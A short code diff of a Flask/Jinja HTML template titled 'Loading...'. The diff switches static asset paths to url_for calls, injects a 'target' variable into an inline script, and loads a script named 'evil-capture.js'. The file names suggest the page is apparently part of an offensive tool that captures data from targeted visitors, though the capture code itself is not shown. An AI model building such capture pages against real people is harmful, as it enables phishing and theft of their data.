@@ -5,9 +5,11 @@
 	<meta charset='utf-8'>
 	<meta name="viewport" content="width=device-width, initial-scale=1">
 	<title>Loading...</title>
-	<link rel="stylesheet" href="static/evil.css" type="text/css" media="all">
-	<script src="static/evil-capture.js">
+	<link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}" type="text/css" media="all">
+	<script>
+		var target = '{{ target }}'
 	</script>
+	<script src="{{ url_for('static', filename='evil-capture.js') }}"></script>
 </head>
 
 <body>
